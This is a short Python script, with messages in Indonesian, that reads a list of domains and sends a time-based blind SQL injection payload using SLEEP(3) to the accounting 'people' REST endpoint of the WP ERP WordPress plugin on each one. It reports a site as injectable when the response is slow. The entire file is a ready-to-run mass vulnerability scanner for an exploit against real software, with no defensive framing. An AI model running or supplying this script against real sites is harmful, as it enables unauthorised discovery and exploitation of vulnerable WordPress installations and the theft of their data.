import requests
import time

def get_url_scheme(domain):
    try:
        response = requests.get(f'https://{domain}', timeout=5)
        if response.status_code == 200:
            return 'https://'
    except requests.RequestException:
        return 'http://'
    return 'http://'

def test_sql_injection(domain):
    url_scheme = get_url_scheme(domain)
    target_url = f'{url_scheme}{domain}/wp-json/erp/v1/accounting/v1/people?type='

    payload = "customer') AND (SELECT 1 FROM (SELECT SLEEP(3))x) AND ('x'='x"

    start_time = time.time()
    try:
        response = requests.get(target_url + payload)
    except requests.RequestException as e:
        print(f"Kesalahan saat mengirim permintaan ke {domain}: {e}")
        return

    end_time = time.time()
    response_time = end_time - start_time

    if response_time > 3:
        print(f"[{domain}] Potensi injeksi SQL berhasil. Waktu respon: {response_time}")
    else:
        print(f"[{domain}] Injeksi SQL gagal atau target tidak rentan. Waktu respon: {response_time}")

# Baca daftar domain dari file
file_path = input("Masukkan list file: ")
try:
    with open(file_path, 'r') as file:
        domains = [line.strip() for line in file]
        for domain in domains:
            test_sql_injection(domain)
except FileNotFoundError:
    print("File tidak ditemukan.")
except Exception as e:
    print(f"Terjadi kesalahan: {e}")
